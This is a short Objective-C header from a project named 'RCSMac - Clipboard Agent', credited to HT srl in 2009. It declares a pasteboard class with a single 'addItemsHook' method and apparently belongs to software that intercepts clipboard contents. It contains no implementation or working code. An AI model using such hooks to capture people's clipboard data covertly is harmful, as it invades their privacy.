/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>


@interface myUIPasteboard : NSObject

- (void)addItemsHook:(NSArray *)items;

@end
